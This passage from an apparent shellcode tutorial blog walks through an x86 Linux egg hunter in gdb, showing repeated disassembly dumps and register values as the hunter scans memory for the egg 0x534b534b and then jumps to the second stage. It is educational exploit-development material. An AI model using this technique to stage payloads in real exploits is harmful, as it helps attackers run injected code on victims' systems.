   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>

<span class="n">Breakpoint</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x0804a079</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
</code></pre></div> <p>The <code class="highlighter-rouge">EDX</code> register currently hold the value <code class="highlighter-rouge">0x8048000</code>, which is a particular memory segment. This value is placed into <code class="highlighter-rouge">EDI</code> and a <code class="highlighter-rouge">scas</code> performs a string comparison between the <code class="highlighter-rouge">DWORD</code> value in <code class="highlighter-rouge">EAX</code>, which is the egg, <code class="highlighter-rouge">0x534b534b</code>, and the value in the memory address in <code class="highlighter-rouge">EDI</code>, which is <code class="highlighter-rouge">0x7f 0x45 0x4c 0x46</code>.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="err">$</span><span class="mi">73</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">74</span> <span class="o">=</span> <span class="mh">0x8048004</span>
<span class="err">$</span><span class="mi">75</span> <span class="o">=</span> <span class="mh">0x8048000</span>
<span class="err">$</span><span class="mi">76</span> <span class="o">=</span> <span class="mh">0x8048000</span>
<span class="mh">0x8048000</span><span class="o">:</span>	<span class="mh">0x7f</span>	<span class="mh">0x45</span>	<span class="mh">0x4c</span>	<span class="mh">0x46</span>
<span class="n">eflags</span>         <span class="mh">0x206</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a080</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
</code></pre></div> <p>As the value in the memory location, <code class="highlighter-rouge">0x8048000</code>, pointed to by the <code class="highlighter-rouge">EDI</code> register does not match the value of the egg in the <code class="highlighter-rouge">EAX</code> register, the zero flag will not be set. This directs the execution of the process back to the <code class="highlighter-rouge">inc edx</code> instruction which increments the value in the <code class="highlighter-rouge">EDX</code> by <code class="highlighter-rouge">1</code>.</p> <p>The next memory location that is placed into <code class="highlighter-rouge">EDI</code> is <code class="highlighter-rouge">0x8048001</code> as the value in <code class="highlighter-rouge">EDX</code> is assigned into <code class="highlighter-rouge">EDI</code>.</p> <p>This process continues until the string comparison conducted by <code class="highlighter-rouge">scas</code> results in a match, thus setting the zero flag.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="err">$</span><span class="mi">113</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">114</span> <span class="o">=</span> <span class="mh">0x8048005</span>
<span class="err">$</span><span class="mi">115</span> <span class="o">=</span> <span class="mh">0x8048001</span>
<span class="err">$</span><span class="mi">116</span> <span class="o">=</span> <span class="mh">0x8048001</span>
<span class="mh">0x8048001</span><span class="o">:</span>	<span class="mh">0x45</span>	<span class="mh">0x4c</span>	<span class="mh">0x46</span>	<span class="mh">0x01</span>
<span class="n">eflags</span>         <span class="mh">0x206</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a080</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
</code></pre></div> <p>Eventually, the value <code class="highlighter-rouge">0x804a0a0</code> is loaded from <code class="highlighter-rouge">EDX</code> into <code class="highlighter-rouge">EDI</code>.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="err">$</span><span class="mi">4037</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">4038</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="err">$</span><span class="mi">4039</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>
<span class="err">$</span><span class="mi">4040</span> <span class="o">=</span> <span class="mh">0x804a0a3</span>
<span class="mh">0x804a0a3</span> <span class="o">&lt;</span><span class="n">second_stage</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="mh">0x53</span>	<span class="mh">0x4b</span>	<span class="mh">0x53</span>	<span class="mh">0x4b</span>
<span class="n">eflags</span>         <span class="mh">0x206</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a07e</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
</code></pre></div> <p>A <code class="highlighter-rouge">DWORD</code> string comparison is conducted between the value in the <code class="highlighter-rouge">EAX</code> register, which is the egg, <code class="highlighter-rouge">0x534b534b</code>, and the value in the memory address currently pointed to by <code class="highlighter-rouge">EDI</code>, which is <code class="highlighter-rouge">0x4b 0x53 0x4b 0x53</code>. As this is a match, the zero flag is set and process will ignore the conditional jump instruction and move on to the following <code class="highlighter-rouge">scas</code> instruction.</p> <p>It is important to note, that after the string comparison occurred, the <code class="highlighter-rouge">scas</code> instruction adds four bytes to the memory location pointed to by <code class="highlighter-rouge">EDI</code>. As such, <code class="highlighter-rouge">EDI</code> has been updated from <code class="highlighter-rouge">0x804a0a0</code> to <code class="highlighter-rouge">0x804a0a4</code>.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="err">$</span><span class="mi">4041</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">4042</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="err">$</span><span class="mi">4043</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>
<span class="err">$</span><span class="mi">4044</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>
<span class="mh">0x804a0a0</span> <span class="o">&lt;</span><span class="n">second_stage</span><span class="o">&gt;:</span>	<span class="mh">0x4b</span>	<span class="mh">0x53</span>	<span class="mh">0x4b</span>	<span class="mh">0x53</span>
<span class="n">eflags</span>         <span class="mh">0x206</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a080</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
<span class="err">$</span><span class="mi">4045</span> <span class="o">=</span> <span class="mh">0x534b534b</span>
<span class="err">$</span><span class="mi">4046</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="err">$</span><span class="mi">4047</span> <span class="o">=</span> <span class="mh">0x804a0a0</span>
<span class="err">$</span><span class="mi">4048</span> <span class="o">=</span> <span class="mh">0x804a0a4</span>
<span class="mh">0x804a0a4</span> <span class="o">&lt;</span><span class="n">second_stage</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="mh">0x4b</span>	<span class="mh">0x53</span>	<span class="mh">0x4b</span>	<span class="mh">0x53</span>
<span class="n">eflags</span>         <span class="mh">0x246</span>	<span class="err">[</span> <span class="n">PF</span> <span class="n">ZF</span> <span class="n">IF</span> <span class="err">]</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">egg_hunter</span><span class="o">:</span>
   <span class="mh">0x0804a060</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">cld</span>    
   <span class="mh">0x0804a061</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
   <span class="mh">0x0804a063</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a065</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;:</span>	<span class="k">or</span>     <span class="n">dx</span><span class="p">,</span><span class="mh">0xfff</span>
   <span class="mh">0x0804a06a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;:</span>	<span class="k">inc</span>    <span class="n">edx</span>
   <span class="mh">0x0804a06b</span> <span class="o">&lt;+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">ebx</span><span class="p">,</span><span class="err">[</span><span class="n">edx</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span>
   <span class="mh">0x0804a06e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x21</span>
   <span class="mh">0x0804a073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">int</span>    <span class="mh">0x80</span>
   <span class="mh">0x0804a075</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">cmp</span>    <span class="n">al</span><span class="p">,</span><span class="mh">0xf2</span>
   <span class="mh">0x0804a077</span> <span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;:</span>	<span class="k">je</span>     <span class="mh">0x804a065</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">5</span><span class="o">&gt;</span>
   <span class="mh">0x0804a079</span> <span class="o">&lt;+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x534b534b</span>
   <span class="mh">0x0804a07e</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">edx</span>
   <span class="mh">0x0804a080</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
<span class="o">=&gt;</span> <span class="mh">0x0804a081</span> <span class="o">&lt;+</span><span class="mi">33</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a083</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">scas</span>   <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">es</span><span class="o">:</span><span class="p">[edi]</span>
   <span class="mh">0x0804a084</span> <span class="o">&lt;+</span><span class="mi">36</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x804a06a</span> <span class="o">&lt;</span><span class="n">egg_hunter</span><span class="o">+</span><span class="mi">10</span><span class="o">&gt;</span>
   <span class="mh">0x0804a086</span> <span class="o">&lt;+</span><span class="mi">38</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="n">edi</span>
   <span class="mh">0x0804a088</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="p">[eax],</span><span class="n">al</span>
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="mh">0x0804a081</span> <span class="k">in</span> <span class="n">egg_hunter</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
